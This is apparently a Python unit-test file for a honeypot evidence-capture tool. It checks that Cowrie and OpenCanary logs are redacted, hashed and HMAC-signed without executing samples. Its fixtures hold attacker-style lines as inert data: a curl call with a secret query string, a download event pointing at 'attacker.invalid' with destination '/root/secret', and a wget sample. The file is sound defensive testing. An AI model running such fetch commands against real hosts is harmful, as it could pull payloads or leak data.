"""Verify restricted capture of real sensor JSON event shapes, not fake attacker data.

Fixtures are synthetic and NEVER counted as external attacks. Tests use only
local temporary directories and do not run or open sample contents as code.
"""
import hashlib
import json
import os
from pathlib import Path
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parent))
from evidence_capture import (
    EvidenceError, capture, verify_manifest, command_class,
    local_artifact, normalized_time, SCHEMA,
)

KEY = "test-only-evidence-hmac-" + "q" * 50


def cowrie(eventid, **changes):
    event = {
        "eventid": eventid,
        "protocol": "ssh",
        "session": "ci-synthetic-session-123",
        "timestamp": "2026-11-19T10:10:10.000Z",
        "src_ip": "198.51.100.100",
        "username": "secret-username-example",
        "password": "unique-CREDENTIAL-SHOULD-NEVER-APPEAR",
    }
    event.update(changes)
    return event


class CaptureTests(unittest.TestCase):
    def files(self, records):
        self.temp = tempfile.TemporaryDirectory()
        root = Path(self.temp.name)
        source = root / "raw.jsonl"
        output = root / "restricted" / "proof.json"
        source.write_text("\n".join(json.dumps(r) for r in records) + "\n",
                          encoding="utf-8")
        self.addCleanup(self.temp.cleanup)
        return root, source, output

    def test_realistic_cowrie_timeline_no_raw_credentials_or_command(self):
        root, src, out = self.files([
            cowrie("cowrie.session.connect"),
            cowrie("cowrie.login.failed"),
            cowrie("cowrie.login.success"),
            cowrie("cowrie.command.input",input="curl https://private.domain/cmd?secret=123"),
            cowrie("cowrie.session.closed",duration_ms=3300),
        ])
        report = capture(src,out,"cowrie",KEY)
        self.assertEqual(report["accepted"],5)
        self.assertEqual(report["counts_by_class"]["authentication_attempt"],1)
        self.assertEqual(report["counts_by_class"]["honeypot_login_accepted"],1)
        self.assertFalse(report["uploaded"])
        self.assertEqual(report["public_indicators"],0)
        data=json.loads(out.read_text())
        self.assertEqual(data["schema"],SCHEMA)
        self.assertEqual(data["records"][3]["command_category"],"download_attempt")
        self.assertFalse(data["records"][2]["verified_intrusion"])
        self.assertFalse(data["records"][0]["share_authorized"])
        self.assertEqual(data["records"][0]["session_ref"],
                         data["records"][3]["session_ref"])
        self.assertEqual(data["records"][0]["observed_at"],
                         "2026-11-19T10:10:10.000Z")
        self.assertEqual(verify_manifest(out,KEY)["events"],5)
        export=out.read_text()
        for forbidden in ("unique-CREDENTIAL", "secret-username", "private.domain",
                          "cmd?secret=123", "198.51.100.100",
                          "ci-synthetic-session-123"):
            self.assertNotIn(forbidden,export)
        if os.name=="posix":
            self.assertEqual(out.stat().st_mode & 0o777, 0o600)

    def test_hash_real_local_tty_without_including_bytes_in_index(self):
        root,src,out=self.files([])
        (root/"tty").mkdir()
        tape=(root/"tty"/"synthetic-tape.log")
        tape.write_bytes(b"FAKE-REPLAY-DO-NOT-RENDER-123")
        expected=hashlib.sha256(tape.read_bytes()).hexdigest()
        src.write_text(json.dumps(cowrie("cowrie.log.closed",
                    ttylog="/cowrie/cowrie-git/var/lib/cowrie/tty/synthetic-tape.log",
                    shasum="a"*64,size=tape.stat().st_size))+"\n")
        capture(src,out,"cowrie",KEY,tty_dir=root/"tty")
        item=json.loads(out.read_text())["records"][0]["evidence"]
        self.assertEqual(item["kind"],"tty_recording")
        self.assertEqual(item["verification"],"locally_hashed")
        self.assertEqual(item["artifact"]["sha256"],expected)
        self.assertEqual(item["cowrie_reported_input_sha256"],"a"*64)
        self.assertIsNone(item["file_hash_verified_against_source"])
        self.assertNotIn("FAKE-REPLAY",out.read_text())

    def test_malware_sample_is_hashed_only_no_execution(self):
        root,src,out=self.files([])
        (root/"downloads").mkdir()
        raw=b"\x7fELF"+b"not-executable-synthetic-sample"
        digest=hashlib.sha256(raw).hexdigest()
        (root/"downloads"/digest).write_bytes(raw)
        src.write_text(json.dumps(cowrie("cowrie.session.file_download",
                    outfile="/cowrie/cowrie-git/var/lib/cowrie/downloads/"+digest,
                    shasum=digest,url="https://attacker.invalid/hidden",
                    destfile="/root/secret"))+"\n")
        result=capture(src,out,"cowrie",KEY,download_dir=root/"downloads")
        self.assertFalse(result["sample_executed"])
        evidence=json.loads(out.read_text())["records"][0]["evidence"]
        self.assertEqual(evidence["verification"],"locally_hashed")
        self.assertTrue(evidence["file_hash_verified_against_source"])
        self.assertEqual(evidence["artifact"]["file_type_hint"],"ELF")
        self.assertNotIn("attacker.invalid",out.read_text())
        self.assertNotIn("/root/secret",out.read_text())

    def test_hash_mismatch_is_not_misrepresented_as_verified(self):
        root,src,out=self.files([])
        (root/"downloads").mkdir()
        (root/"downloads"/"sample").write_bytes(b"harmless synthetic bytes")
        src.write_text(json.dumps(cowrie("cowrie.session.file_upload",
                       outfile="/some/source/sample",shasum="a"*64))+"\n")
        capture(src,out,"cowrie",KEY,download_dir=root/"downloads")
        e=json.loads(out.read_text())["records"][0]["evidence"]
        self.assertEqual(e["verification"],"source_checksum_mismatch")
        self.assertFalse(e["file_hash_verified_against_source"])

    def test_symlink_and_nonregular_filenames_never_read(self):
        root,src,out=self.files([])
        (root/"download").mkdir()
        outside=root/"private.txt"
        outside.write_text("private")
        (root/"download"/"unsafe").symlink_to(outside)
        self.assertIsNone(local_artifact(root/"download","unsafe"))
        (root/"download"/"dir").mkdir()
        self.assertIsNone(local_artifact(root/"download","dir"))
        self.assertIsNone(local_artifact(root/"download","../../"))
        src.write_text(json.dumps(cowrie("cowrie.log.closed",ttylog="unsafe"))+"\n")
        capture(src,out,"cowrie",KEY,tty_dir=root/"download")
        self.assertEqual(json.loads(out.read_text())["records"][0]["evidence"]["verification"],"unavailable")

    def test_source_reported_size_is_not_equated_to_physical_tty_bytes(self):
        root,src,out=self.files([])
        (root/"tty").mkdir()
        (root/"tty"/"demo.log").write_bytes(b"data")
        src.write_text(json.dumps(cowrie("cowrie.log.closed",
                                        ttylog="demo.log",size=999))+"\n")
        capture(src,out,"cowrie",KEY,tty_dir=root/"tty")
        e=json.loads(out.read_text())["records"][0]["evidence"]
        self.assertEqual(e["verification"],"locally_hashed")
        self.assertEqual(e["artifact"]["size_bytes"],4)
        self.assertEqual(e["cowrie_reported_size_bytes"],999)
        self.assertTrue(e["artifact"]["sha256"])

    def test_opencanary_mysql_and_ftp_records_without_passwords(self):
        root,src,out=self.files([
            {"dst_port":13306,"logtype":1001,"src_host":"192.0.2.123",
             "timestamp":"2026-11-19T11:00:00Z","password":"supersecret"},
            {"dst_port":2121,"logtype":1002,"src_host":"192.0.2.123",
             "timestamp":"2026-11-19T11:01:00Z","username":"foo"},
            {"dst_port":22,"logtype":5000,"raw":"not-allowed"},
        ])
        result=capture(src,out,"opencanary",KEY)
        self.assertEqual(result["accepted"],2)
        self.assertEqual(result["rejected"],1)
        self.assertEqual(json.loads(out.read_text())["records"][0]["protocol"],"MYSQL")
        self.assertNotIn("supersecret",out.read_text())
        self.assertNotIn("192.0.2.123",out.read_text())

    def test_hmac_signature_detects_late_tampering(self):
        root,src,out=self.files([cowrie("cowrie.login.failed")])
        capture(src,out,"cowrie",KEY)
        self.assertTrue(verify_manifest(out,KEY)["verified"])
        altered=json.loads(out.read_text())
        altered["records"][0]["event_class"]="honeypot_login_accepted"
        out.write_text(json.dumps(altered))
        with self.assertRaises(EvidenceError):
            verify_manifest(out,KEY)
        with self.assertRaises(EvidenceError):
            verify_manifest(out,"wrong-key-"+("x"*32))

    def test_limits_missing_key_and_repeated_output_blocked(self):
        root,src,out=self.files([cowrie("cowrie.session.connect")])
        with self.assertRaises(EvidenceError):
            capture(src,out,"cowrie","short")
        with self.assertRaises(EvidenceError):
            capture(src,out,"cowrie",KEY,max_lines=0)
        self.assertEqual(capture(src,out,"cowrie",KEY)["accepted"],1)
        with self.assertRaises(EvidenceError):
            capture(src,out,"cowrie",KEY)

    def test_missing_timestamps_are_null_not_fabricated(self):
        root,src,out=self.files([cowrie("cowrie.session.connect",
                                       timestamp="bad-time")])
        capture(src,out,"cowrie",KEY)
        r=json.loads(out.read_text())["records"][0]
        self.assertIsNone(r["observed_at"])
        self.assertIsNone(r["network_daily_ref"])

    def test_log_input_limit_blocks_excessively_large_stream(self):
        root,src,out=self.files([cowrie("cowrie.session.connect"),
                                  cowrie("cowrie.session.closed")])
        with self.assertRaises(EvidenceError):
            capture(src,out,"cowrie",KEY,max_lines=1)
        self.assertFalse(out.exists())

    def test_command_categories_without_raw_command_output(self):
        self.assertEqual(command_class("uname -a"),"reconnaissance")
        self.assertEqual(command_class("crontab -l"),"persistence_attempt")
        self.assertEqual(command_class("chmod +x foobar"),"privilege_or_access_change")
        self.assertEqual(command_class("wget https://example.invalid"),"download_attempt")
        self.assertEqual(command_class("hello world"),"other_command")


if __name__=="__main__":
    unittest.main()
